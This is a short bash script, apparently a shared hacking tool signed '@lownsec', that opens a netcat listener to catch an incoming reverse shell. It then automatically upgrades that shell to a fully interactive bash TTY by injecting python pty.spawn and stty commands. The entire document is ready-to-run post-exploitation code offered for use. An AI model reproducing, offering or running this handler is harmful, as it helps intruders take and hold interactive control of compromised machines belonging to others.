#!/bin/bash
clear
sleep 0.25
echo -e "🇵‌🇪‌🇷‌🇫‌🇪‌🇨‌🇹‌ 🇸‌🇭‌🇪‌🇱‌🇱‌"
echo -e "@lownsec"

    if [[ $1 ]]; then
        port=$1
    else
        port=9090
    fi

    stty raw -echo; (echo 'python3 -c "import pty;pty.spawn(\"/bin/bash\")" || python -c "import pty;pty.spawn(\"/bin/bash\")"' ;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)"; echo reset;cat) | nc -lvnp $port && reset
